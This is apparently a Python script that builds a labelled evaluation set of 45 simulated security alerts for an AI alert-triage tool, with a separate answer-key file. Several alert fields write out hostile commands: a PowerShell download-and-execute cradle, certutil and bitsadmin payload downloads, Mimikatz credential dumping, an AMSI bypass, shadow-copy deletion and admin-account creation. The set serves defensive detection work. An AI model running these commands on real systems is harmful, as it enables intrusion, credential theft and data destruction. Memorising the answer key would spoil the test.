"""
Dataset builder for the AI-Powered Security Alert Analyst.

Alerts are hand-authored (not templated) so they read like real SIEM/EDR
telemetry. This script is a build-time tool: it writes the canonical
`alerts.json` and a separate `eval_labels.json`.

Design notes:
- alerts.json contains ONLY telemetry fields. It never contains a verdict,
  so the ground-truth label can never leak into the analysis prompt.
- eval_labels.json maps alert_id -> analyst-intended verdict. It is used
  only by tests / evaluation and is never sent to the model.
- `category` is a detection bucket (which rule fired), NOT a verdict. Real
  alerts carry this, and benign/suspicious/malicious activity can share a
  category, which is exactly what makes the classification task non-trivial.
"""
import json
import pathlib
from datetime import datetime

OUT_DIR = pathlib.Path(__file__).parent  # data/alerts/

SEVERITIES = {"low", "medium", "high", "critical"}
CATEGORIES = {
    "PowerShell Execution",
    "Suspicious Command Execution",
    "Brute-force Authentication",
    "Malware Detection",
    "Suspicious Network Connection",
    "Privilege Escalation",
    "Normal Administrative Activity",
}

# Each tuple: (alert dict, expected_verdict)
# expected_verdict in {"Benign", "Suspicious", "Malicious"} — eval only.
ALERTS = [
    # ---------------- PowerShell Execution ----------------
    ({
        "alert_id": "ALRT-1001",
        "timestamp": "2025-09-14T08:12:04Z",
        "hostname": "WKSTN-FIN-07",
        "username": "j.martinez",
        "source_ip": "10.20.14.37",
        "process": "powershell.exe",
        "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\Export-ADUsers.ps1 -OU Finance",
        "severity": "low",
        "category": "PowerShell Execution",
        "description": "PowerShell invoked with -ExecutionPolicy Bypass to run a signed internal reporting script during business hours."
    }, "Benign"),
    ({
        "alert_id": "ALRT-1002",
        "timestamp": "2025-09-14T02:47:51Z",
        "hostname": "WKSTN-HR-12",
        "username": "s.kaur",
        "source_ip": "10.20.9.61",
        "process": "powershell.exe",
        "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...truncated...",
        "severity": "high",
        "category": "PowerShell Execution",
        "description": "Encoded, hidden-window PowerShell launched off-hours from a standard user workstation. Encoded payload decodes to a network download routine."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1003",
        "timestamp": "2025-09-13T22:05:19Z",
        "hostname": "SRV-APP-02",
        "username": "SYSTEM",
        "source_ip": "10.30.2.15",
        "process": "powershell.exe",
        "command_line": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.44/a.ps1')\"",
        "severity": "critical",
        "category": "PowerShell Execution",
        "description": "Classic download-cradle: in-memory execution of a remote script fetched from an external IP with no TLS."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1004",
        "timestamp": "2025-09-14T03:00:12Z",
        "hostname": "SRV-FILE-01",
        "username": "svc_maint",
        "source_ip": "10.30.5.9",
        "process": "powershell.exe",
        "command_line": "powershell.exe -NoProfile -File C:\\Maint\\Clear-TempFiles.ps1",
        "severity": "low",
        "category": "PowerShell Execution",
        "description": "Scheduled maintenance script run by a maintenance service account at its usual nightly window."
    }, "Benign"),
    ({
        "alert_id": "ALRT-1005",
        "timestamp": "2025-09-14T11:33:40Z",
        "hostname": "WKSTN-ENG-19",
        "username": "d.oyelaran",
        "source_ip": "10.20.22.101",
        "process": "powershell.exe",
        "command_line": "powershell.exe -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')...\"",
        "severity": "high",
        "category": "PowerShell Execution",
        "description": "Command line contains a known AMSI-bypass reflection pattern intended to disable in-process script scanning."
    }, "Suspicious"),

    # ---------------- Suspicious Command Execution ----------------
    ({
        "alert_id": "ALRT-1006",
        "timestamp": "2025-09-13T19:41:07Z",
        "hostname": "WKSTN-SALES-04",
        "username": "r.gupta",
        "source_ip": "10.20.31.88",
        "process": "certutil.exe",
        "command_line": "certutil.exe -urlcache -split -f http://198.51.100.23/update.exe C:\\Users\\Public\\update.exe",
        "severity": "high",
        "category": "Suspicious Command Execution",
        "description": "certutil abused as a download utility (LOLBin) to retrieve an executable from an external host."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1007",
        "timestamp": "2025-09-13T20:15:22Z",
        "hostname": "SRV-WEB-03",
        "username": "iis_apppool",
        "source_ip": "10.30.7.20",
        "process": "cmd.exe",
        "command_line": "cmd.exe /c whoami & net user & ipconfig /all",
        "severity": "medium",
        "category": "Suspicious Command Execution",
        "description": "Sequential host-reconnaissance commands executed under a web application pool identity, consistent with post-exploitation discovery."
    }, "Suspicious"),
    ({
        "alert_id": "ALRT-1008",
        "timestamp": "2025-09-14T09:02:11Z",
        "hostname": "WKSTN-IT-02",
        "username": "helpdesk1",
        "source_ip": "10.20.1.50",
        "process": "cmd.exe",
        "command_line": "cmd.exe /c ipconfig /all",
        "severity": "low",
        "category": "Suspicious Command Execution",
        "description": "Single network configuration lookup by a help-desk operator while troubleshooting a ticket."
    }, "Benign"),
    ({
        "alert_id": "ALRT-1009",
        "timestamp": "2025-09-13T23:58:44Z",
        "hostname": "SRV-DB-01",
        "username": "a.novak",
        "source_ip": "10.30.3.11",
        "process": "bitsadmin.exe",
        "command_line": "bitsadmin /transfer job /download /priority high http://203.0.113.77/p.dll C:\\Windows\\Temp\\p.dll",
        "severity": "high",
        "category": "Suspicious Command Execution",
        "description": "bitsadmin used to transfer a DLL from an external host into a temp directory, a common malware staging technique."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1010",
        "timestamp": "2025-09-14T14:20:03Z",
        "hostname": "WKSTN-ENG-05",
        "username": "t.almeida",
        "source_ip": "10.20.22.77",
        "process": "wmic.exe",
        "command_line": "wmic process call create \"cmd.exe /c calc.exe\"",
        "severity": "medium",
        "category": "Suspicious Command Execution",
        "description": "wmic process-call-create used to spawn a child process; benign target but the technique is frequently abused for lateral execution."
    }, "Suspicious"),

    # ---------------- Brute-force Authentication ----------------
    ({
        "alert_id": "ALRT-1011",
        "timestamp": "2025-09-13T04:12:00Z",
        "hostname": "SRV-SSH-01",
        "username": "root",
        "source_ip": "45.134.26.9",
        "process": "sshd",
        "command_line": "sshd: 240 failed password attempts for root in 90 seconds",
        "severity": "high",
        "category": "Brute-force Authentication",
        "description": "High-rate SSH password guessing against root from a single external IP, followed by no successful login."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1012",
        "timestamp": "2025-09-13T05:03:31Z",
        "hostname": "DC01",
        "username": "multiple",
        "source_ip": "10.20.44.200",
        "process": "lsass.exe",
        "command_line": "4625: 60 accounts, 1 failed logon each, single source host (password spray)",
        "severity": "high",
        "category": "Brute-force Authentication",
        "description": "One failed logon across sixty distinct accounts from a single internal host within two minutes — classic password-spray pattern."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1013",
        "timestamp": "2025-09-14T08:59:10Z",
        "hostname": "WKSTN-FIN-03",
        "username": "l.hoffmann",
        "source_ip": "10.20.14.12",
        "process": "lsass.exe",
        "command_line": "4625: 3 failed logons then 4624 success for l.hoffmann",
        "severity": "low",
        "category": "Brute-force Authentication",
        "description": "Three failed interactive logons followed by a success at start of business — consistent with a mistyped password."
    }, "Benign"),
    ({
        "alert_id": "ALRT-1014",
        "timestamp": "2025-09-13T06:44:27Z",
        "hostname": "SRV-RDP-02",
        "username": "administrator",
        "source_ip": "91.219.236.14",
        "process": "svchost.exe",
        "command_line": "4625: 480 failed RDP logons for administrator over 15 minutes",
        "severity": "critical",
        "category": "Brute-force Authentication",
        "description": "Sustained RDP brute force against the local administrator account from an external IP on an internet-exposed host."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1015",
        "timestamp": "2025-09-14T07:30:15Z",
        "hostname": "DC01",
        "username": "svc_backup",
        "source_ip": "10.30.5.9",
        "process": "lsass.exe",
        "command_line": "4740: account svc_backup locked out after 5 failed logons",
        "severity": "medium",
        "category": "Brute-force Authentication",
        "description": "Service account lockout after repeated failures, correlated with a recently rotated password not yet updated in the job scheduler."
    }, "Benign"),

    # ---------------- Malware Detection ----------------
    ({
        "alert_id": "ALRT-1016",
        "timestamp": "2025-09-13T21:17:53Z",
        "hostname": "WKSTN-HR-08",
        "username": "p.singh",
        "source_ip": "10.20.9.44",
        "process": "mimikatz.exe",
        "command_line": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"",
        "severity": "critical",
        "category": "Malware Detection",
        "description": "EDR detected the Mimikatz credential-dumping tool attempting to read logon secrets from LSASS memory."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1017",
        "timestamp": "2025-09-13T18:22:09Z",
        "hostname": "WKSTN-SALES-11",
        "username": "m.rossi",
        "source_ip": "10.20.31.140",
        "process": "winword.exe",
        "command_line": "winword.exe /n \"C:\\Users\\m.rossi\\Downloads\\invoice_scan.doc\"",
        "severity": "high",
        "category": "Malware Detection",
        "description": "AV engine flagged an Emotet-family macro dropper spawned from a Word document opened from the Downloads folder."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1018",
        "timestamp": "2025-09-14T10:05:36Z",
        "hostname": "WKSTN-IT-04",
        "username": "secops",
        "source_ip": "10.20.1.72",
        "process": "eicar_test.com",
        "command_line": "C:\\Temp\\eicar_test.com",
        "severity": "low",
        "category": "Malware Detection",
        "description": "AV signature matched the EICAR test string during a scheduled endpoint-protection validation by the security team."
    }, "Benign"),
    ({
        "alert_id": "ALRT-1019",
        "timestamp": "2025-09-13T20:48:12Z",
        "hostname": "SRV-APP-05",
        "username": "SYSTEM",
        "source_ip": "10.30.2.31",
        "process": "rundll32.exe",
        "command_line": "rundll32.exe C:\\Windows\\Temp\\s7x.dll,StartW",
        "severity": "high",
        "category": "Malware Detection",
        "description": "rundll32 loading an unsigned DLL from a temp path with a generic export name, consistent with loader/second-stage execution."
    }, "Suspicious"),
    ({
        "alert_id": "ALRT-1020",
        "timestamp": "2025-09-14T13:11:58Z",
        "hostname": "WKSTN-MKT-06",
        "username": "b.chen",
        "source_ip": "10.20.18.90",
        "process": "setup_toolbar.exe",
        "command_line": "C:\\Users\\b.chen\\Downloads\\setup_toolbar.exe /silent",
        "severity": "medium",
        "category": "Malware Detection",
        "description": "Potentially-unwanted adware installer detected and quarantined; user-initiated download of a browser toolbar bundle."
    }, "Suspicious"),

    # ---------------- Suspicious Network Connection ----------------
    ({
        "alert_id": "ALRT-1021",
        "timestamp": "2025-09-13T21:30:00Z",
        "hostname": "WKSTN-ENG-19",
        "username": "d.oyelaran",
        "source_ip": "10.20.22.101",
        "process": "svchost.exe",
        "command_line": "outbound tcp/443 to 185.220.101.44 every 60s +/- 3s, 512-byte payloads",
        "severity": "high",
        "category": "Suspicious Network Connection",
        "description": "Regular low-jitter beaconing to a known malicious IP with uniform small payloads, consistent with C2 check-in."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1022",
        "timestamp": "2025-09-13T23:12:41Z",
        "hostname": "WKSTN-FIN-07",
        "username": "j.martinez",
        "source_ip": "10.20.14.37",
        "process": "chrome.exe",
        "command_line": "outbound tcp/9001 to 171.25.193.20 (Tor entry node)",
        "severity": "medium",
        "category": "Suspicious Network Connection",
        "description": "Connection to a published Tor node on a Tor ORPort from a finance workstation with no business need for anonymity networks."
    }, "Suspicious"),
    ({
        "alert_id": "ALRT-1023",
        "timestamp": "2025-09-14T01:55:19Z",
        "hostname": "SRV-DB-01",
        "username": "a.novak",
        "source_ip": "10.30.3.11",
        "process": "sqlservr.exe",
        "command_line": "outbound tcp/443 to 203.0.113.190, 4.2 GB transferred in 20 min",
        "severity": "critical",
        "category": "Suspicious Network Connection",
        "description": "Large volume of data egressing from a database server to an unfamiliar external host outside maintenance windows — possible exfiltration."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1024",
        "timestamp": "2025-09-14T03:20:05Z",
        "hostname": "SRV-APP-02",
        "username": "SYSTEM",
        "source_ip": "10.30.2.15",
        "process": "svchost.exe",
        "command_line": "outbound tcp/443 to 13.107.4.50 (Windows Update CDN)",
        "severity": "low",
        "category": "Suspicious Network Connection",
        "description": "Server contacting a Microsoft update content-delivery endpoint during the nightly patch window."
    }, "Benign"),
    ({
        "alert_id": "ALRT-1025",
        "timestamp": "2025-09-14T02:10:33Z",
        "hostname": "SRV-FILE-01",
        "username": "svc_backup",
        "source_ip": "10.30.5.9",
        "process": "backupagent.exe",
        "command_line": "outbound tcp/443 to backup.corp-vault.example (approved cloud backup)",
        "severity": "low",
        "category": "Suspicious Network Connection",
        "description": "Nightly backup agent uploading to the organisation's approved cloud backup target on schedule."
    }, "Benign"),

    # ---------------- Privilege Escalation ----------------
    ({
        "alert_id": "ALRT-1026",
        "timestamp": "2025-09-13T22:41:16Z",
        "hostname": "WKSTN-HR-08",
        "username": "p.singh",
        "source_ip": "10.20.9.44",
        "process": "net.exe",
        "command_line": "net localgroup administrators p.singh /add",
        "severity": "high",
        "category": "Privilege Escalation",
        "description": "A standard user added their own account to the local Administrators group outside any change window."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1027",
        "timestamp": "2025-09-13T22:39:02Z",
        "hostname": "WKSTN-HR-08",
        "username": "p.singh",
        "source_ip": "10.20.9.44",
        "process": "fodhelper.exe",
        "command_line": "fodhelper.exe (auto-elevated) -> spawns cmd.exe with HKCU ms-settings hijack",
        "severity": "high",
        "category": "Privilege Escalation",
        "description": "Known fodhelper UAC-bypass pattern: auto-elevating binary launching a shell via a registry hijack to obtain high integrity."
    }, "Malicious"),
    ({
        "alert_id": "ALRT-1028",
        "timestamp": "2025-09-13T03:26:48Z",
        "hostname": "DC01",
        "username": "unknown",
        "source_ip": "10.20.44.200",
        "process": "net.exe",
        "command_line": "net user svc_helper P@ssw0rd!23 /add & net localgroup administrators svc_helper /add",
        "severity": "critical",
        "category": "Privilege Escalation",
        "description": "New account created and immediately added to Administrators on a domain controller at 3am with no corresponding change ticket."
    }, "Suspicious"),
    ({
        "alert_id": "ALRT-1029",
        "timestamp": "2025-09-14T10:40:22Z",
        "hostname": "WKSTN-ENG-05",
        "username": "it_admin",
        "source_ip": "10.20.1.50",
        "process": "net.exe",
        "command_line": "net localgroup administrators t.almeida /add",
        "severity": "low",
        "category": "Privilege Escalation",
        "description": "IT administrator granted local admin to an engineer under approved change CHG-4471 during business hours."
    }, "Benign"),
    ({
        "alert_id": "ALRT-1030",
        "timestamp": "2025-09-14T06:00:09Z",
        "hostname": "SRV-APP-02",
        "username": "SYSTEM",
        "source_ip": "10.30.2.15",
        "process": "gpupdate.exe",
        "command_line": "gpupdate /force  (GPO grants 'Log on as a service' to svc_app)",
        "severity": "low",
        "category": "Privilege Escalation",
        "description": "Group Policy applying a documented service-logon right to a service account during scheduled policy refresh."
    }, "Benign"),

    # ---------------- Normal Administrative Activity ----------------
    ({
        "alert_id": "ALRT-1031",
        "timestamp": "2025-09-14T02:00:00Z",
        "hostname": "SRV-BACKUP-01",
        "username": "svc_backup",
        "source_ip": "10.30.5.40",
        "process": "backupagent.exe",
        "command_line": "backupagent.exe --run-job nightly-full --target vault",
        "severity": "low",
        "category": "Normal Administrative Activity",
        "description": "Scheduled nightly full backup job started at its configured time by the backup service account."
    }, "Benign"),
    ({
        "alert_id": "ALRT-1032",
        "timestamp": "2025-09-14T04:15:27Z",
        "hostname": "WKSTN-FIN-03",
        "username": "SYSTEM",
        "source_ip": "10.20.14.12",
        "process": "ccmexec.exe",
        "command_line": "ccmexec.exe install KB5039211 (SCCM deployment)",
        "severity": "low",
        "category": "Normal Administrative Activity",
        "description": "Approved monthly security patch installed via SCCM during the maintenance window."
    }, "Benign"),
    ({
        "alert_id": "ALRT-1033",
        "timestamp": "2025-09-14T09:45:50Z",
        "hostname": "SRV-APP-02",
        "username": "it_admin",
        "source_ip": "10.20.1.50",
        "process": "mstsc.exe",
        "command_line": "RDP session from jump host JMP-01 to SRV-APP-02",
        "severity": "low",
        "category": "Normal Administrative Activity",
        "description": "Administrator RDP session originating from the designated jump host during business hours, matching normal admin baseline."
    }, "Benign"),
    ({
        "alert_id": "ALRT-1034",
        "timestamp": "2025-09-14T12:02:14Z",
        "hostname": "WKSTN-ENG-19",
        "username": "d.oyelaran",
        "source_ip": "10.20.22.101",
        "process": "msiexec.exe",
        "command_line": "msiexec.exe /i \\\\pkg-share\\apps\\JetBrains-Toolbox.msi /qn",
        "severity": "low",
        "category": "Normal Administrative Activity",
        "description": "Silent install of approved developer tooling from the internal software packaging share."
    }, "Benign"),
    ({
        "alert_id": "ALRT-1035",
        "timestamp": "2025-09-14T11:10:41Z",
        "hostname": "DC01",
        "username": "it_admin",
        "source_ip": "10.20.1.50",
        "process": "dsa.msc",
        "command_line": "Active Directory Users and Computers: reset password for new hire a.willis",
        "severity": "low",
        "category": "Normal Administrative Activity",
        "description": "Routine password reset for a new-hire account performed by IT through the standard AD management console."
    }, "Benign"),

    # ================= Sprint 2 additions (rebalance to 15/15/15) =================
    # --- PowerShell Execution ---
    ({
        "alert_id": "ALRT-1036",
        "timestamp": "2025-09-13T21:58:33Z",
        "hostname": "WKSTN-SALES-04",
        "username": "r.gupta",
        "source_ip": "10.20.31.88",
        "process": "powershell.exe",
        "command_line": "powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
        "severity": "high",
        "category": "PowerShell Execution",
        "description": "Attempt to disable Microsoft Defender real-time protection from a standard user session — defence-evasion behaviour."
    }, "Suspicious"),
    ({
        "alert_id": "ALRT-1037",
        "timestamp": "2025-09-14T13:44:12Z",
        "hostname": "WKSTN-ENG-05",
        "username": "t.almeida",
        "source_ip": "10.20.22.77",
        "process": "powershell.exe",
        "command_line": "powershell.exe -Command \"Invoke-WebRequest https://pastebin.com/raw/xY3k -OutFile $env:TEMP\\r.ps1\"",
        "severity": "medium",
        "category": "PowerShell Execution",
        "description": "Script downloaded from a public paste site to a temp path. No execution observed yet, but the retrieval pattern is commonly malicious."
    }, "Suspicious"),

    # --- Suspicious Command Execution ---
    ({
        "alert_id": "ALRT-1038",
        "timestamp": "2025-09-13T23:20:41Z",
        "hostname": "SRV-APP-05",
        "username": "SYSTEM",
        "source_ip": "10.30.2.31",
        "process": "schtasks.exe",
        "command_line": "schtasks /create /sc minute /mo 10 /tn Updater /tr \"powershell -w hidden -File C:\\Windows\\Temp\\u.ps1\" /ru SYSTEM",
        "severity": "high",
        "category": "Suspicious Command Execution",
        "description": "Scheduled task created to run a hidden PowerShell script from a temp path every 10 minutes as SYSTEM — a common persistence technique."
    }, "Suspicious"),
    ({
        "alert_id": "ALRT-1039",
        "timestamp": "2025-09-13T22:11:05Z",
        "hostname": "WKSTN-HR-12",
        "username": "s.kaur",
        "source_ip": "10.20.9.61",
        "process": "net.exe",
        "command_line": "net use \\\\SRV-FILE-01\\C$ /user:corp\\s.kaur * && copy payload.dat \\\\SRV-FILE-01\\C$\\Windows\\Temp\\",
        "severity": "high",
        "category": "Suspicious Command Execution",
        "description": "Access to an administrative share on a remote server followed by a file copy into a temp directory — consistent with lateral-movement staging."
    }, "Suspicious"),
    ({
        "alert_id": "ALRT-1040",
        "timestamp": "2025-09-14T02:33:57Z",
        "hostname": "SRV-FILE-01",
        "username": "administrator",
        "source_ip": "10.30.5.9",
        "process": "vssadmin.exe",
        "command_line": "vssadmin.exe delete shadows /all /quiet",
        "severity": "critical",
        "category": "Suspicious Command Execution",
        "description": "Volume shadow copies deleted silently across the system — a hallmark ransomware precursor that removes local recovery points."
    }, "Malicious"),

    # --- Brute-force Authentication ---
    ({
        "alert_id": "ALRT-1041",
        "timestamp": "2025-09-13T07:12:48Z",
        "hostname": "SRV-VPN-01",
        "username": "multiple",
        "source_ip": "10.20.44.200",
        "process": "vpnd",
        "command_line": "35 failed VPN auth attempts across 12 accounts in 6 minutes from one host",
        "severity": "medium",
        "category": "Brute-force Authentication",
        "description": "Moderate-rate authentication failures across multiple accounts from a single internal host; could be a misconfigured client or early-stage spraying."
    }, "Suspicious"),

    # --- Malware Detection ---
    ({
        "alert_id": "ALRT-1042",
        "timestamp": "2025-09-14T09:51:26Z",
        "hostname": "WKSTN-MKT-06",
        "username": "b.chen",
        "source_ip": "10.20.18.90",
        "process": "unknown.exe",
        "command_line": "C:\\Users\\b.chen\\Downloads\\invoice_2025_09.pdf.exe",
        "severity": "high",
        "category": "Malware Detection",
        "description": "EDR heuristic flagged a packed executable using a double extension to masquerade as a PDF. No known family signature matched; behaviour is suspicious."
    }, "Suspicious"),

    # --- Suspicious Network Connection ---
    ({
        "alert_id": "ALRT-1043",
        "timestamp": "2025-09-13T20:59:14Z",
        "hostname": "SRV-DB-01",
        "username": "a.novak",
        "source_ip": "10.30.3.11",
        "process": "dns.exe",
        "command_line": "1,240 DNS TXT queries to *.exfil-lookup.example in 5 min, avg label length 58 chars",
        "severity": "high",
        "category": "Suspicious Network Connection",
        "description": "High volume of long-label DNS TXT queries to a single external domain, consistent with DNS tunnelling for covert data transfer."
    }, "Suspicious"),
    ({
        "alert_id": "ALRT-1044",
        "timestamp": "2025-09-13T21:05:02Z",
        "hostname": "WKSTN-ENG-19",
        "username": "d.oyelaran",
        "source_ip": "10.20.22.101",
        "process": "svchost.exe",
        "command_line": "outbound tcp/4444 to 194.5.249.13 established, interactive session",
        "severity": "critical",
        "category": "Suspicious Network Connection",
        "description": "Interactive outbound connection to an external host on tcp/4444, a common reverse-shell/C2 port, from a workstation with no such business need."
    }, "Malicious"),

    # --- Privilege Escalation ---
    ({
        "alert_id": "ALRT-1045",
        "timestamp": "2025-09-13T23:41:37Z",
        "hostname": "SRV-APP-05",
        "username": "iis_apppool",
        "source_ip": "10.30.2.31",
        "process": "sc.exe",
        "command_line": "sc config UpdaterSvc binPath= \"cmd /c C:\\Windows\\Temp\\p.exe\"",
        "severity": "high",
        "category": "Privilege Escalation",
        "description": "Existing service reconfigured to launch an executable from a temp path under a service pool identity — service abuse to run code with higher privileges."
    }, "Suspicious"),
]


def build():
    alerts = []
    labels = {}
    seen_ids = set()
    seen_categories = set()

    for alert, verdict in ALERTS:
        # --- structural validation at build time ---
        required = {
            "alert_id", "timestamp", "hostname", "username", "source_ip",
            "process", "command_line", "severity", "category", "description",
        }
        missing = required - alert.keys()
        assert not missing, f"{alert.get('alert_id')} missing fields: {missing}"
        assert alert["alert_id"] not in seen_ids, f"duplicate id {alert['alert_id']}"
        assert alert["severity"] in SEVERITIES, f"bad severity in {alert['alert_id']}"
        assert alert["category"] in CATEGORIES, f"bad category in {alert['alert_id']}"
        datetime.strptime(alert["timestamp"], "%Y-%m-%dT%H:%M:%SZ")  # ISO 8601 UTC
        assert verdict in {"Benign", "Suspicious", "Malicious"}

        seen_ids.add(alert["alert_id"])
        seen_categories.add(alert["category"])
        alerts.append(alert)
        labels[alert["alert_id"]] = verdict

    # every required category must be represented
    assert seen_categories == CATEGORIES, f"missing categories: {CATEGORIES - seen_categories}"
    # must have suspicious AND benign (and malicious) present
    verdict_set = set(labels.values())
    assert {"Benign", "Suspicious", "Malicious"} <= verdict_set, verdict_set
    assert len(alerts) >= 30, f"only {len(alerts)} alerts"

    OUT_DIR.mkdir(parents=True, exist_ok=True)
    (OUT_DIR / "alerts.json").write_text(json.dumps(alerts, indent=2) + "\n")
    (OUT_DIR / "eval_labels.json").write_text(json.dumps(labels, indent=2) + "\n")

    # summary
    from collections import Counter
    cat_counts = Counter(a["category"] for a in alerts)
    ver_counts = Counter(labels.values())
    sev_counts = Counter(a["severity"] for a in alerts)
    print(f"Wrote {len(alerts)} alerts to {OUT_DIR/'alerts.json'}")
    print(f"Categories ({len(cat_counts)}): {dict(cat_counts)}")
    print(f"Verdicts: {dict(ver_counts)}")
    print(f"Severities: {dict(sev_counts)}")


if __name__ == "__main__":
    build()
